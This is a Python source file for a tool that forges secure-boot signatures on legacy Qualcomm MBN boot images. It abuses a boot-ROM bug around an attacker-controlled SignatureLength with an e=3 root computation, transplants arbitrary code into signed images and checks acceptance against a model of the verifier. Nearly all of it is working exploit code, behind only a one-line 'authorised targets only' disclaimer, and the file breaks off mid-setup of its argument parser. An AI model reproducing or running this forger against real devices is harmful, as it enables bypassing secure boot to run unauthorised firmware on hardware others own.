#!/usr/bin/env python3
"""
legacy MBN fakeSigner -- forges legacy MBN signatures by abusing the
Qualcomm PBL short-signature bug (attacker-controlled SignatureLength).

Layout follows TalAloni/QualcommSecureBoot-SecondaryExecutableVerifier:
  80-byte (0x50) header, little-endian
    0x00 CodeWord  D1 DC 4B 84
    0x04 Magic     34 10 D7 73            (read as u32: 0x73D71034)
    0x08 ImageType 0x0D eHostDL / 0x15 SBL1 / "5A 43 0B 7D" => real header at 0x2800
    0x14 HeaderSize (0x50)
    0x18 LoadingAddress
    0x1C BodySize   = CodeSize + SigLen + CertLen
    0x20 CodeSize
    0x24 SignatureAddress        (memory address; file = 0x50 + addr - load)
    0x28 SignatureLength         <-- attacker-controlled; this tool sets it to L
    0x2C CertificateStoreAddress
    0x30 CertificateStoreLength
  layout: header || code || signature || cert store

Digest chain (TalAloni Note 3):
  D1 = H(header || code)
  D2 = H((SW_ID ^ 0x36 repeated) || D1)
  D3 = H((HW_ID ^ 0x5c repeated) || D2)
  The PBL compares the raw D3 -- no DigestInfo wrapper is involved.

For security research on your own / authorised targets only.
"""

import argparse
import hashlib
import math
import os
import secrets
import sys

# ------------------------------------------------------------------ DER ----

def _der_len(buf, off):
    """Return (value_start, value_end, next_offset)."""
    if off + 2 > len(buf):
        raise ValueError("truncated DER at %d" % off)
    l = buf[off + 1]
    p = off + 2
    if l & 0x80:
        nb = l & 0x7F
        if nb == 0 or p + nb > len(buf):
            raise ValueError("unsupported DER length at %d" % off)
        l = int.from_bytes(buf[p:p + nb], "big")
        p += nb
    return p, p + l, l


def _der_walk(buf, start, end, depth=0):
    """Yield (tag, vstart, vend)."""
    off = start
    while off < end:
        tag = buf[off]
        vs, ve, _l = _der_len(buf, off)
        if ve > end:
            return
        yield tag, vs, ve
        off = ve


def _len_enc(n):
    if n < 0x80:
        return bytes([n])
    b = n.to_bytes((n.bit_length() + 7) // 8, "big")
    return bytes([0x80 | len(b)]) + b


def tlv(tag, content):
    return bytes([tag]) + _len_enc(len(content)) + content


# ----------------------------------------------------------------- X509 ----

def x509_pubkey(cert):
    """Extract the RSA public key (n, e) from an X.509 DER blob. No third-party deps."""
    t, vs, ve = next(_der_walk(cert, 0, len(cert)))
    if t != 0x30:
        raise ValueError("cert is not a SEQUENCE")

    def _find_spki(start, end, depth=0):
        for tag, s, e in _der_walk(cert, start, end):
            if tag == 0x30:
                if depth >= 1 and _contains_bitstring(s, e):
                    return s, e
                r = _find_spki(s, e, depth + 1)
                if r:
                    return r
        return None

    def _contains_bitstring(s, e):
        return any(tt == 0x03 for tt, _, _ in _der_walk(cert, s, e))

    spki = _find_spki(vs, ve)
    if spki is None:
        raise ValueError("no SubjectPublicKeyInfo found")
    s, e = spki
    for tag, bs, be in _der_walk(cert, s, e):
        if tag == 0x03:                       # BIT STRING; first byte is the unused-bit count
            inner = cert[bs + 1:be]
            it, ivs, ive = next(_der_walk(inner, 0, len(inner)))
            if it != 0x30:
                continue
            ints = [inner[a:b] for tg, a, b in _der_walk(inner, ivs, ive) if tg == 0x02]
            if len(ints) >= 2:
                n = int.from_bytes(ints[0], "big")
                e_ = int.from_bytes(ints[1], "big")
                return n, e_
    raise ValueError("no RSA key in SPKI")


def x509_strings(cert):
    """Collect printable strings in the cert (eyeball SW_ID / HW_ID / hash OU)."""
    out = []

    def walk(s, e, d=0):
        for tag, a, b in _der_walk(cert, s, e):
            if tag in (0x13, 0x0C, 0x16, 0x14, 0x1E):
                try:
                    out.append(cert[a:b].decode("ascii"))
                except UnicodeDecodeError:
                    pass
            elif tag in (0x30, 0x31) and d < 8:
                walk(a, b, d + 1)

    _t, vs, ve = next(_der_walk(cert, 0, len(cert)))
    walk(vs, ve)
    return out


_OID_SHA256RSA = bytes.fromhex("2A864886F70D01010B")
_OID_RSA = bytes.fromhex("2A864886F70D010101")
_OID_CN = bytes.fromhex("550403")
_OID_OU = bytes.fromhex("55040B")


def _int_der(x):
    b = x.to_bytes((x.bit_length() + 8) // 8 or 1, "big")
    return tlv(0x02, b)


def pkcs1_v15_sign(n, d, digest, algo="sha256"):
    """Ordinary PKCS#1 v1.5 signature (used only to build a real cert in selftest; the attack itself does not need it)."""
    di = {
        "sha256": bytes.fromhex("3031300D060960864801650304020105000420"),
        "sha1": bytes.fromhex("3021300906052B0E03021A05000414"),
    }[algo]
    k = (n.bit_length() + 7) // 8
    t = di + digest
    if k < len(t) + 11:
        raise ValueError("modulus too small")
    em = b"\x00\x01" + b"\xff" * (k - len(t) - 3) + b"\x00" + t
    return pow(int.from_bytes(em, "big"), d, n).to_bytes(k, "big")


def build_selfsigned(n, e, d, ou=b"07 0001 SHA256", cn=b"FAKE SIGNER TEST"):
    """Build a self-signed e=3 certificate to serve as the selftest donor."""
    name = tlv(0x30, tlv(0x31, tlv(0x30, tlv(0x06, _OID_CN) + tlv(0x13, cn))
                          + tlv(0x30, tlv(0x06, _OID_OU) + tlv(0x13, ou))))
    algid = tlv(0x30, tlv(0x06, _OID_SHA256RSA) + tlv(0x05, b""))
    spki = tlv(0x30, tlv(0x30, tlv(0x06, _OID_RSA) + tlv(0x05, b""))
                     + tlv(0x03, b"\x00" + tlv(0x30, _int_der(n) + _int_der(e))))
    validity = tlv(0x30, tlv(0x17, b"200101000000Z") + tlv(0x17, b"300101000000Z"))
    tbs = tlv(0x30, tlv(0xA0, _int_der(2)) + _int_der(1) + algid
                    + name + validity + name + spki)
    sig = pkcs1_v15_sign(n, d, hashlib.sha256(tbs).digest())
    return tlv(0x30, tbs + algid + tlv(0x03, b"\x00" + sig))


# ------------------------------------------------------------------ MBN ----

CODEWORD = bytes([0xD1, 0xDC, 0x4B, 0x84])
MAGIC = bytes([0x34, 0x10, 0xD7, 0x73])
HEADER_LEN = 0x50
IMAGE_TYPE_AHEAD = 0x7D0B435A
HEADER_AHEAD_OFFSET = 0x2800


class MbnHeader:
    __slots__ = ("raw", "base")

    def __init__(self, raw, base):
        self.raw = bytearray(raw)
        self.base = base

    @staticmethod
    def read(buf):
        base = 0
        if buf[0:4] == CODEWORD and buf[4:8] == MAGIC:
            from_le = lambda o: int.from_bytes(buf[o:o + 4], "little")
            if from_le(0x08) == IMAGE_TYPE_AHEAD:
                base = HEADER_AHEAD_OFFSET
        if buf[base:base + 4] != CODEWORD or buf[base + 4:base + 8] != MAGIC:
            return None
        return MbnHeader(buf[base:base + HEADER_LEN], base)

    def _u32(self, off):
        return int.from_bytes(self.raw[off:off + 4], "little")

    def _set_u32(self, off, v):
        self.raw[off:off + 4] = int(v).to_bytes(4, "little")

    # fields
    image_type = property(lambda s: s._u32(0x08))
    header_size = property(lambda s: s._u32(0x14))
    load_addr = property(lambda s: s._u32(0x18))
    body_size = property(lambda s: s._u32(0x1C))
    code_size = property(lambda s: s._u32(0x20))
    sig_addr = property(lambda s: s._u32(0x24))
    sig_len = property(lambda s: s._u32(0x28))
    cert_addr = property(lambda s: s._u32(0x2C))
    cert_len = property(lambda s: s._u32(0x30))

    def set(self, load_addr=None, code_size=None, sig_addr=None,
            sig_len=None, cert_addr=None, cert_len=None, body_size=None):
        if load_addr is not None:
            self._set_u32(0x18, load_addr)
        if code_size is not None:
            self._set_u32(0x20, code_size)
        if sig_addr is not None:
            self._set_u32(0x24, sig_addr)
        if sig_len is not None:
            self._set_u32(0x28, sig_len)
        if cert_addr is not None:
            self._set_u32(0x2C, cert_addr)
        if cert_len is not None:
            self._set_u32(0x30, cert_len)
        if body_size is not None:
            self._set_u32(0x1C, body_size)

    def file_off(self, mem_addr):
        """Memory address -> file offset. The body starts at base+header_size and maps onto load_addr."""
        hs = self.header_size or HEADER_LEN
        return self.base + hs + mem_addr - self.load_addr

    def dump(self):
        f = [("CodeWord", self.raw[0:4].hex(" ")),
             ("Magic", self.raw[4:8].hex(" ")),
             ("ImageType", hex(self.image_type)),
             ("HeaderSize", hex(self.header_size)),
             ("LoadingAddress", hex(self.load_addr)),
             ("BodySize", "%d (0x%x)" % (self.body_size, self.body_size)),
             ("CodeSize", "%d (0x%x)" % (self.code_size, self.code_size)),
             ("SignatureAddress", hex(self.sig_addr)),
             ("SignatureLength", "%d (0x%x)" % (self.sig_len, self.sig_len)),
             ("CertStoreAddress", hex(self.cert_addr)),
             ("CertStoreLength", "%d (0x%x)" % (self.cert_len, self.cert_len))]
        for k, v in f:
            print("    %-20s %s" % (k, v))


def extract_certs(buf, hdr):
    store = buf[hdr.file_off(hdr.cert_addr):][:hdr.cert_len]
    out = []
    off = 0
    while off < len(store) - 4:
        if store[off] == 0x30 and store[off + 1] == 0x82:
            ln = int.from_bytes(store[off + 2:off + 4], "big") + 4
            out.append(store[off:off + ln])
            off += ln
        else:
            break
    return out


def detect_hash(cert):
    if b"SHA256" in cert:
        return "sha256"
    if b"SHA1" in cert:
        return "sha1"
    return "sha1"          # TalAloni: with no OU entry the PBL falls back to SHA-1


def image_digest(header_bytes, code, key1, key2, algo="sha256"):
    """D1/D2/D3; key1 is the inner 0x36 key, key2 the outer 0x5c key."""
    h = (lambda b: hashlib.sha256(b).digest()) if algo == "sha256" \
        else (lambda b: hashlib.sha1(b).digest())
    d1 = h(bytes(header_bytes) + bytes(code))
    d2 = h(bytes(b ^ 0x36 for b in key1) + d1)
    d3 = h(bytes(b ^ 0x5C for b in key2) + d2)
    return d1, d2, d3


# ------------------------------------------------- PBL verification model ----

def pbl_verify_signature(modulus, exponent, signature, digest, strict=False):
    """
    Replicates auth_verify_signature(). The internal result buffer is
    little-endian, so v68[:hash_len] holds the low-order bytes of the integer,
    i.e. the digest reversed.
    """
    mod_len, exp_len, sig_len = len(modulus), len(exponent), len(signature)
    hl = len(digest)

    if not (0 < mod_len <= 0x100) or not (0 < exp_len <= 4) \
            or not (0 < sig_len <= 0x100):
        return False, 1046
    if strict and sig_len != mod_len:
        return False, 9999

    i = 0
    while i < exp_len and exponent[i] == 0:
        i += 1
    ok3 = (i + 1 == exp_len and exponent[i] == 3)
    ok65 = (i + 3 == exp_len and exponent[i] == 1
            and exponent[i + 1] == 0 and exponent[i + 2] == 1)
    if not (ok3 or ok65):
        return False, 1070

    n = int.from_bytes(modulus, "big")
    e = int.from_bytes(exponent, "big")
    s = int.from_bytes(signature, "big")

    x = pow(s, e, n)
    v68 = x.to_bytes(((mod_len + 3) // 4) * 4, "little")
    w = [int.from_bytes(v68[4 * k:4 * k + 4], "little")
         for k in range(len(v68) // 4)]

    if int.from_bytes(v68[hl:hl + 4], "little") != 0xFFFFFF00:
        return False, 1131
    v60 = (hl >> 2) + 1
    v13 = (sig_len >> 2) - 1
    if v60 < v13:
        k = v60
        while w[k] == 0xFFFFFFFF:
            k += 1
            if k >= v13:
                break
        else:
            return False, 1150
    if w[v13] != 0x0001FFFF:
        return False, 1158
    if v68[:hl] != digest[::-1]:
        return False, 1173
    return True, 0


FAIL = {1046: "length sanity check", 1070: "exponent not in {3,65537}",
        1131: "00 FF FF FF after the digest does not match",
        1150: "0xFF padding scan failed",
        1158: "top word of the window is not 00 01 FF FF",
        1173: "digest mismatch",
        9999: "sig_len != mod_len"}


def audit(buf):
    """
    Independently re-derives everything from the file on disk and checks that
    the header length/address fields are self-consistent. These are the fields
    most easily got wrong when transplanting code, so they get their own audit.
    """
    probs = []
    hdr = MbnHeader.read(buf)
    if hdr is None:
        return ["not a legacy MBN (CodeWord/Magic not found)"], None

    hs = hdr.header_size
    if hs != HEADER_LEN:
        probs.append("HeaderSize = 0x%x, expected 0x50" % hs)

    if hdr.body_size != hdr.code_size + hdr.sig_len + hdr.cert_len:
        probs.append("BodySize %d != CodeSize %d + SigLen %d + CertLen %d (= %d)" % (
            hdr.body_size, hdr.code_size, hdr.sig_len, hdr.cert_len,
            hdr.code_size + hdr.sig_len + hdr.cert_len))

    need = hdr.base + hs + hdr.body_size
    if len(buf) < need:
        probs.append("file is only %d bytes, cannot hold the %d bytes header+body needs"
                     % (len(buf), need))
    elif len(buf) > need:
        probs.append("file is %d bytes longer than header+body (trailing data)"
                     % (len(buf) - need))

    if hdr.sig_addr != hdr.load_addr + hdr.code_size:
        probs.append("SigAddress 0x%x != Load 0x%x + CodeSize %d (= 0x%x)" % (
            hdr.sig_addr, hdr.load_addr, hdr.code_size,
            hdr.load_addr + hdr.code_size))
    if hdr.cert_addr != hdr.sig_addr + hdr.sig_len:
        probs.append("CertAddress 0x%x != SigAddr 0x%x + SigLen %d (= 0x%x)" % (
            hdr.cert_addr, hdr.sig_addr, hdr.sig_len, hdr.sig_addr + hdr.sig_len))

    for name, off, ln in (("code", hdr.file_off(hdr.load_addr), hdr.code_size),
                          ("signature", hdr.file_off(hdr.sig_addr), hdr.sig_len),
                          ("cert store", hdr.file_off(hdr.cert_addr), hdr.cert_len)):
        if off < 0 or off + ln > len(buf):
            probs.append("%s range [0x%x, 0x%x) out of bounds (file is %d bytes)"
                         % (name, off, off + ln, len(buf)))
    for name, a1, l1, a2 in (("code/signature", hdr.load_addr, hdr.code_size, hdr.sig_addr),
                             ("signature/cert", hdr.sig_addr, hdr.sig_len, hdr.cert_addr)):
        if a1 + l1 > a2:
            probs.append("%s ranges overlap" % name)
    return probs, hdr


# ---------------------------------------------------------------- forging ----

def forge(n, e, digest, L):
    """Build an L-byte PKCS#1 v1.5 window and take its e-th root modulo 2^(8L)."""
    hl = len(digest)
    # The PBL indexes words via (L>>2); the top word it actually checks is
    # buf[align-4 .. align-1] with align = 4*(L>>2). So when L is not a multiple
    # of 4, up to 3 bytes at the very top are never looked at -- there is no
    # need to force L to be a multiple of 4.
    align = 4 * (L >> 2)
    if align - 4 < hl + 1:
        return None, "L=%d cannot hold a %d-byte digest plus separator" % (L, hl)

    buf = bytearray(L)
    buf[0:hl] = digest[::-1]           # digest goes at the low-order end
    buf[hl] = 0x00                     # separator
    for i in range(hl + 1, align - 4):
        buf[i] = 0xFF
    buf[align - 4] = 0xFF              # top word; reads as 0x0001FFFF little-endian,
                                       # i.e. the EM prefix 00 01 FF FF
    buf[align - 3] = 0xFF
    buf[align - 2] = 0x01
    buf[align - 1] = 0x00

    T = int.from_bytes(bytes(buf), "little")
    if T % 2 == 0:
        return None, "digest is even; no e-th root exists mod 2^k"
    if e % 2 == 0:
        return None, "e is even"

    k = 8 * L
    d = pow(e, -1, 1 << (k - 1))       # |(Z/2^k)^*| = 2^(k-1)
    s = pow(T, d, 1 << k)
    if pow(s, e, 1 << k) != T:
        return None, "e-th root self-check failed"

    if s.bit_length() * e > n.bit_length() + 8:
        return None, "s^e is %d bits > n's %d bits, reduction unavoidable" % (
            s.bit_length() * e, n.bit_length())
    if pow(s, e) >= n:
        return None, "s^e >= n; the reduction destroys the low bits"
    return s.to_bytes(L, "big"), None


# -------------------------------------------------------------------- CLI ----

def parse_hex8(s, what):
    b = bytes.fromhex(s.replace(" ", "").replace("0x", ""))
    if len(b) != 8:
        raise SystemExit("%s must be 8 bytes of hex (16 hex characters)" % what)
    return b


def _keygen(bits=2048, e=3):
    def is_prime(n, r=16):
        if n < 2:
            return False
        for p in (2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37):
            if n % p == 0:
                return n == p
        d, s = n - 1, 0
        while d % 2 == 0:
            d //= 2
            s += 1
        for _ in range(r):
            a = secrets.randbelow(n - 3) + 2
            x = pow(a, d, n)
            if x == 1 or x == n - 1:
                continue
            for _ in range(s - 1):
                x = x * x % n
                if x == n - 1:
                    break
            else:
                return False
        return True

    def gen(half):
        while True:
            p = secrets.randbits(half) | (1 << (half - 1)) | 1
            if p % 3 == 2 and is_prime(p):
                return p

    p, q = gen(bits // 2), gen(bits // 2)
    while q == p:
        q = gen(bits // 2)
    n = p * q
    lam = (p - 1) * (q - 1) // math.gcd(p - 1, q - 1)
    return n, e, pow(e, -1, lam), p, q


def cmd_info(a):
    buf = open(a.mbn, "rb").read()
    hdr = MbnHeader.read(buf)
    if hdr is None:
        raise SystemExit("not a legacy MBN (CodeWord/Magic not found)")
    print("[+] header @0x%x" % hdr.base)
    hdr.dump()
    certs = extract_certs(buf, hdr)
    print("[+] cert chain: %d certificate(s)" % len(certs))
    if not certs:
        return
    idx = min(a.leaf_index, len(certs) - 1)
    n, e = x509_pubkey(certs[idx])
    print("[+] leaf[%d] public key: n = %d bits  e = %d" % (idx, n.bit_length(), e))
    print("[+] hash algorithm guess: %s" % detect_hash(certs[idx]))
    print("[+] root cert SHA-256: %s" % hashlib.sha256(certs[-1]).hexdigest())
    strs = x509_strings(certs[idx])
    if strs:
        print("[+] strings in leaf (SW_ID / HW_ID usually live here, 16 hex chars):")
        for s in strs:
            print("      %s" % s)
    if a.dump_code:
        off = hdr.file_off(hdr.load_addr)
        open(a.dump_code, "wb").write(buf[off:off + hdr.code_size])
        print("[+] code segment dumped to %s (%d bytes, file offset 0x%x, load addr 0x%x)"
              % (a.dump_code, hdr.code_size, off, hdr.load_addr))
    if e == 3:
        lo, hi = 40, n.bit_length() // (8 * e)
        print("[!] e = 3 -- forgeable. Measured usable L in [%d, %d]" % (lo, hi))
        print("    constraint: e*8L = %d bits must stay below log2(n) = %d bits" %
              (8 * e * hi, n.bit_length()))
    else:
        print("[-] e = %d -- short-signature forgery is not feasible" % e)


def _int_auto(s):
    return int(s, 16) if s.lower().startswith("0x") else int(s, 0)


def cmd_sign(a):
    # ---- target image (supplies the code) ----
    tbuf = thdr = None
    if a.payload_mbn:
        tbuf = open(a.payload_mbn, "rb").read()
        thdr = MbnHeader.read(tbuf)
        if thdr is None:
            raise SystemExit("payload-mbn is not a legacy MBN")
        if not a.donor:
            a.donor = a.payload_mbn          # pure re-sign: reuse its own cert chain
    if not a.donor:
        raise SystemExit("need --donor (supplies the cert chain) or --payload-mbn")

    donor = open(a.donor, "rb").read()
    hdr = MbnHeader.read(donor)
    if hdr is None:
        raise SystemExit("donor is not a legacy MBN")
    certs = extract_certs(donor, hdr)
    if not certs:
        raise SystemExit("donor contains no cert chain")
    idx = min(a.leaf_index, len(certs) - 1)
    n, e = x509_pubkey(certs[idx])

    # Keep the cert store verbatim (including any padding after the last cert);
    # only the parse result is used, to grab the leaf public key. Re-joining the
    # parsed certs would drop that padding -- harmless for the digest, but it
    # would make the output differ from the original image.
    coff = hdr.file_off(hdr.cert_addr)
    cert_store = donor[coff:coff + hdr.cert_len]
    joined = len(b"".join(certs))
    if joined != len(cert_store):
        print("[+] cert chain: %d cert(s) totalling %d bytes, header declares %d bytes"
              % (len(certs), joined, len(cert_store)))
        print("    (%d bytes of trailing padding kept verbatim)"
              % (len(cert_store) - joined))

    print("[+] donor header")
    hdr.dump()
    print("[+] leaf[%d]: n = %d bits, e = %d" % (idx, n.bit_length(), e))
    if e != 3:
        raise SystemExit("leaf exponent e=%d; short-signature forgery is not feasible (need e=3)" % e)

    # ---- code ----
    if a.payload:
        code = bytearray(open(a.payload, "rb").read())
        print("[+] payload: raw file %s (%d bytes)" % (a.payload, len(code)))
    elif thdr is not None:
        off = thdr.file_off(thdr.load_addr)
        code = bytearray(tbuf[off:off + thdr.code_size])
        print("[+] payload: extracted %d bytes of code from %s (file offset 0x%x, load addr 0x%x)"
              % (len(code), a.payload_mbn, off, thdr.load_addr))
        if thdr.base:
            print("    note: this image keeps its header at 0x%x (ImageType=5A430B7D);"
                  " the leading 0x%x bytes are preserved" % (thdr.base, thdr.base))
    else:
        off = hdr.file_off(hdr.load_addr)
        code = bytearray(donor[off:off + hdr.code_size])
        print("[+] payload: reusing the donor's own code (%d bytes)" % len(code))
    if a.code_pad:
        code += b"\x00" * a.code_pad
    while len(code) % 4:
        code.append(0)
    code = bytes(code)

    # ---- header template and load address ----
    use_target_header = (a.header_from == "auto" and thdr is not None) \
        or a.header_from == "payload"
    hb_hdr, hb_buf = (thdr, tbuf) if (use_target_header and thdr) else (hdr, donor)
    prefix = hb_buf[:hb_hdr.base] if hb_hdr.base else b""

    if a.load_addr:
        load = _int_auto(a.load_addr)
        src = "--load-addr"
    elif (a.load_addr_from == "payload" or
          (a.load_addr_from == "auto" and thdr is not None)):
        load = thdr.load_addr
        src = "payload-mbn"
    else:
        load = hdr.load_addr
        src = "donor"
    if thdr is not None and thdr.load_addr != load:
        print("[!] WARNING: the target image was linked for 0x%x, but is now using"
              " 0x%x (from %s). Transplanted code is linked against its original"
              " address and will crash at the wrong one."
              % (thdr.load_addr, load, src))
    print("[+] header template: %s   load address: 0x%x (from %s)"
          % ("payload-mbn" if (use_target_header and thdr) else "donor", load, src))

    algo = a.hash
    if algo == "auto":
        algo = detect_hash(certs[idx])
    print("[+] digest algorithm: %s" % algo)

    key1 = parse_hex8(a.key1, "key1") if a.key1 else \
        parse_hex8(a.sw_id, "sw-id")
    key2 = parse_hex8(a.key2, "key2") if a.key2 else \
        parse_hex8(a.hw_id, "hw-id")
    print("[+] i_key(0x36) = %s" % key1.hex())
    print("[+] o_key(0x5c) = %s" % key2.hex())

    max_L = n.bit_length() // (8 * e)
    # Sweep starts at 44 because RFC 8017 asks for >= 8 0xFF bytes. The PBL
    # itself only demands 5, so L >= 40 also works -- pass --L 40 to squeeze.
    cands = ([a.L] if a.L else list(range(44, max_L + 1)))
    print("[+] candidate L: %s  (hard cap %d, because e*8L < log2 n)" % (cands, max_L))

    for L in cands:
        h = MbnHeader(bytes(hb_hdr.raw), hb_hdr.base)
        h.set(load_addr=load, code_size=len(code),
              sig_addr=load + len(code), sig_len=L,
              cert_addr=load + len(code) + L, cert_len=len(cert_store),
              body_size=len(code) + L + len(cert_store))
        _d1, _d2, d3 = image_digest(h.raw, code, key1, key2, algo)
        sig, err = forge(n, e, d3, L)
        tag = "L=%-3d D3=%s...%s" % (L, d3.hex()[:8], d3.hex()[-2:])
        if sig is None:
            print("    %s  -> skipped (%s)" % (tag, err))
            continue
        print("    %s  -> forged" % tag)

        out = bytearray()
        out += prefix
        out += h.raw
        out += code
        out += sig
        out += cert_store
        if a.out:
            open(a.out, "wb").write(bytes(out))
            probs, _ = audit(bytes(out))
            print("    header self-consistency : %s" % (
                "OK, all lengths and addresses consistent" if not probs
                else "FAIL -> " + "; ".join(probs)))

        ok, rc = pbl_verify_signature(n.to_bytes((n.bit_length() + 7) // 8, "big"),
                                      e.to_bytes((e.bit_length() + 7) // 8 or 1, "big"),
                                      sig, d3)
        st, src = pbl_verify_signature(
            n.to_bytes((n.bit_length() + 7) // 8, "big"),
            e.to_bytes((e.bit_length() + 7) // 8 or 1, "big"), sig, d3, strict=True)
        print()
        print("    PBL verdict (as-is)           : %s" %
              ("ACCEPTED" if ok else "rejected %d %s" % (rc, FAIL.get(rc, ""))))
        print("    PBL verdict (+sig_len==mod_len): %s" %
              ("ACCEPTED" if st else "rejected %d %s" % (src, FAIL.get(src, ""))))
        print("    signature (%d bytes)          : %s" % (len(sig), sig.hex()))
        if a.out:
            print("    output                        : %s" % os.path.abspath(a.out))
        return 0 if ok else 1

    raise SystemExit("every candidate L failed. Try --code-pad 4 to nudge the code"
                     " length (and thus D3), or widen the --L range")


def cmd_verify(a):
    """Independent re-verification: re-derives everything from the file, trusting no intermediate value produced by the signing run."""
    buf = open(a.mbn, "rb").read()
    probs, hdr = audit(buf)
    print("[+] header")
    hdr.dump()

    print("\n[+] header self-consistency audit")
    if probs:
        for p in probs:
            print("    [FAIL] " + p)
        if any("not a legacy" in p or "out of bounds" in p or "overlap" in p for p in probs):
            return 1
    else:
        print("    [OK] all length and address fields consistent")

    print("\n[+] actual file layout")
    for name, off, ln in (("header", hdr.base, hdr.header_size),
                          ("code", hdr.file_off(hdr.load_addr), hdr.code_size),
                          ("signature", hdr.file_off(hdr.sig_addr), hdr.sig_len),
                          ("cert store", hdr.file_off(hdr.cert_addr), hdr.cert_len)):
        print("    %-11s [0x%08x, 0x%08x)  %6d bytes" % (name, off, off + ln, ln))
    print("    %-11s %d bytes" % ("file size", len(buf)))

    certs = extract_certs(buf, hdr)
    if not certs:
        print("\n[-] cert chain is empty, cannot verify")
        return 1
    idx = min(a.leaf_index, len(certs) - 1)
    n, e = x509_pubkey(certs[idx])
    code = buf[hdr.file_off(hdr.load_addr):][:hdr.code_size]
    sig = buf[hdr.file_off(hdr.sig_addr):][:hdr.sig_len]
    algo = detect_hash(certs[idx]) if a.hash == "auto" else a.hash

    key1 = parse_hex8(a.key1, "key1") if a.key1 else parse_hex8(a.sw_id, "sw-id")
    key2 = parse_hex8(a.key2, "key2") if a.key2 else parse_hex8(a.hw_id, "hw-id")
    _d1, _d2, d3 = image_digest(hdr.raw, code, key1, key2, algo)

    print("\n[+] recomputing the digest")
    print("    leaf[%d]: n = %d bits, e = %d, algorithm %s" % (idx, n.bit_length(), e, algo))
    print("    code    %d bytes" % len(code))
    print("    D3      = %s" % d3.hex())

    mod = n.to_bytes((n.bit_length() + 7) // 8, "big")
    exp = e.to_bytes((e.bit_length() + 7) // 8 or 1, "big")
    ok, rc = pbl_verify_signature(mod, exp, sig, d3)
    st, srcc = pbl_verify_signature(mod, exp, sig, d3, strict=True)
    print("\n[+] PBL auth_verify_signature verdict")
    print("    as-is (sig_len=%d, mod_len=%d)  : %s"
          % (len(sig), len(mod), "ACCEPTED" if ok else "rejected %d %s" % (rc, FAIL.get(rc, ""))))
    print("    with sig_len==mod_len enforced : %s"
          % ("ACCEPTED" if st else "rejected %d %s" % (srcc, FAIL.get(srcc, ""))))
    if probs:
        return 1
    return 0 if ok else 1


def cmd_selftest(a):
    print("=" * 72)
    print("selftest: generate a 2048-bit e=3 key plus a self-signed certificate")
    print("          to act as the donor, forge a short signature over a payload,")
    print("          then feed the result back into the PBL verdict model.")
    print("=" * 72)
    n, e, d, _p, _q = _keygen(2048, 3)
    print("\n[+] generated key: n = %d bits, e = %d" % (n.bit_length(), e))
    cert = build_selfsigned(n, e, d)
    print("[+] self-signed certificate: %d bytes" % len(cert))

    payload = bytes(range(256)) * 8 + b"\x90\x00" * 16
    load = 0xFC010000
    hdr = MbnHeader(b"\x00" * HEADER_LEN, 0)
    hdr.raw[0:4] = CODEWORD
    hdr.raw[4:8] = MAGIC
    hdr._set_u32(0x08, 0x15)            # SBL1
    hdr._set_u32(0x14, HEADER_LEN)
    donor = bytes(hdr.raw) + payload + b"\x00" * 256 + cert
    hdr.set(load_addr=load, code_size=len(payload),
            sig_addr=load + len(payload), sig_len=256,
            cert_addr=load + len(payload) + 256, cert_len=len(cert),
            body_size=len(payload) + 256 + len(cert))
    donor = bytes(hdr.raw) + payload + b"\x00" * 256 + cert

    tmp = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                       "_selftest_donor.mbn")
    tmpout = tmp.replace("_donor.mbn", "_forged.mbn")
    open(tmp, "wb").write(donor)

    a.donor, a.payload, a.out = tmp, None, tmpout
    a.payload_mbn = None
    a.header_from = a.load_addr_from = "auto"
    a.load_addr = None
    a.leaf_index = 0
    a.key1 = a.key2 = None
    a.hash = "auto"
    a.sw_id = "0000000000000000" if not a.sw_id else a.sw_id
    a.hw_id = "0000000000000001" if not a.hw_id else a.hw_id
    a.L = a.L
    a.code_pad = 0
    # overwrite with a fresh payload, to prove this signs *any* image
    pl = os.path.join(os.path.dirname(tmp), "_selftest_payload.bin")
    open(pl, "wb").write(b"\xde\xad\xbe\xef" * 64 + b"arbitrary image" * 4)
    a.payload = pl
    print("[+] donor written to %s" % tmp)
    rc = cmd_sign(a)

    # run the --payload-mbn re-sign path too, to exercise the transplant entry
    print("\n" + "=" * 72)
    print("[+] re-sign path check: feed the forged MBN back in as --payload-mbn")
    print("=" * 72)
    import copy
    a2 = copy.copy(a)
    a2.donor = None
    a2.payload = None
    a2.payload_mbn = tmpout
    a2.out = tmpout.replace("_forged.mbn", "_resigned.mbn")
    cmd_sign(a2)
    same = open(tmpout, "rb").read() == open(a2.out, "rb").read()
    print("\n    re-signed output byte-identical to the first forgery: %s" % same)

    print("\n[+] extra check: re-parse the forged image from scratch")
    buf = open(tmpout, "rb").read()
    h2 = MbnHeader.read(buf)
    h2.dump()
    c2 = extract_certs(buf, h2)
    n2, e2 = x509_pubkey(c2[0])
    print("    leaf: n = %d bits, e = %d, cert chain %d cert(s)" % (n2.bit_length(), e2, len(c2)))
    print("    n matches donor: %s" % (n2 == n))
    return rc


def main():
    ap = argparse.ArgumentParser(description="legacy MBN fakeSigner (Qualcomm PBL short-signature bug)")
    sub = ap.add_subparsers(dest="cmd", required=True)

    p = sub.add_parser("info", help="parse the MBN header and cert chain")
    p.add_argument("--mbn", required=True)
    p.add_argument("--leaf-index", type=int, default=0)
    p.add_argument("--dump-code", help="also dump the code segment to this file")
    p.set_defaults(func=cmd_info)

    p = sub.add_parser("sign", help="forge / re-sign / transplant code")
    p.add_argument("--donor", help="MBN supplying the cert chain; defaults to --payload-mbn (pure re-sign)")
    p.add_argument("--payload", help="raw code file to sign")
    p.add_argument("--payload-mbn", help="extract the code segment from another MBN and sign that (transplant)")
    p.add_argument("--header-from", choices=["auto", "donor", "payload"],
                   default="auto", help="whose header to use as template; auto = payload-mbn's when given")
    p.add_argument("--load-addr-from", choices=["auto", "donor", "payload"],
                   default="auto", help="whose load address to use; auto = payload-mbn")
    p.add_argument("--load-addr", help="explicit load address, overrides the above (0x prefix = hex)")
    p.add_argument("--out", required=True)
    p.add_argument("--sw-id", default="0000000000000000")
    p.add_argument("--hw-id", default="0000000000000000")
    p.add_argument("--key1", help="override the inner 0x36 key (8 bytes hex)")
    p.add_argument("--key2", help="override the outer 0x5c key (8 bytes hex)")
    p.add_argument("--hash", choices=["auto", "sha1", "sha256"], default="auto")
    p.add_argument("--leaf-index", type=int, default=0)
    p.add_argument("--L", type=int, help="signature length; omit to sweep 44..hard cap")
    p.add_argument("--code-pad", type=int, default=0, help="append N zero bytes to code to change D3")
    p.set_defaults(func=cmd_sign)

    p = sub.add_parser("verify", help="independently re-verify an MBN (file only, re-derives everything)")
